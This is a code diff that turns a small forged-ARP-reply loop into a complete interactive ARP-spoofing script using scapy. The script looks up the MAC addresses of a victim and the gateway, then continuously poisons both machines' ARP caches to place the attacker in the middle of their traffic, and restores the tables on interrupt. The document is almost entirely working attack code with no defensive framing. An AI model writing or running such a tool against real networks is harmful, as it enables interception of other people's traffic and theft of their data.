@@ -1,17 +1,46 @@
-from scapy.all import ARP, Ether, sendp
-import time
+from scapy.all import *
+    
+def getmac(targetip):
+    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=targetip)
+    targetmac = srp(arppacket, timeout=2, verbose=False)[0][0][1].hwsrc
+    return targetmac
 
-def send_arp_reply(target_ip, target_mac, sender_ip, sender_mac):
-    arp_reply = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=sender_ip, hwsrc=sender_mac)
-    sendp(Ether(dst=target_mac) / arp_reply, verbose=False)
+def spoofarpcache(targetip, targetmac, sourceip):
+    spoofed = ARP(op=2, pdst=targetip, hwdst=targetmac, psrc=sourceip)
+    send(spoofed, verbose=False)
+
+def restorearp(targetip, targetmac, sourceip, sourcemac):
+    packet = ARP(op=2, hwsrc=sourcemac, psrc=sourceip, hwdst=targetmac, pdst=targetip)
+    send(packet, verbose=False)
+    print("ARP Table restored to normal for", targetip)
+
+def main():
+    targetip = input("Enter Target IP:")  # Use input() instead of raw_input() in Python 3
+    gatewayip = input("Enter Gateway IP:")  # Use input() instead of raw_input() in Python 3
+
+    try:
+        targetmac = getmac(targetip)
+        print("Target MAC", targetmac)
+    except:
+        print("Target machine did not respond to ARP broadcast")
+        quit()
+
+    try:
+        gatewaymac = getmac(gatewayip)
+        print("Gateway MAC:", gatewaymac)
+    except:
+        print("Gateway is unreachable")
+        quit()
+    try:
+        print("Sending spoofed ARP responses")
+        while True:
+            spoofarpcache(targetip, targetmac, gatewayip)
+            spoofarpcache(gatewayip, gatewaymac, targetip)
+    except KeyboardInterrupt:
+        print("ARP spoofing stopped")
+        restorearp(gatewayip, gatewaymac, targetip, targetmac)
+        restorearp(targetip, targetmac, gatewayip, gatewaymac)
+        quit()
 
 if __name__ == "__main__":
-    # Replace these values with the target and sender IP and MAC addresses
-    target_ip = "192.168.0.193"  # The IP address of the target machine
-    target_mac = "B4-8C-9D-E0-2D-E6"  # The MAC address of the target machine
-    sender_ip = "192.168.0.191"  # The IP address of the sender
-    sender_mac = "B4-8C-9D-E0-2D-E6"  # The MAC address of the sender
-
-    while True:
-        send_arp_reply(target_ip, target_mac, sender_ip, sender_mac)
-        time.sleep(1)  # Send ARP replies every 1 second
+    main()
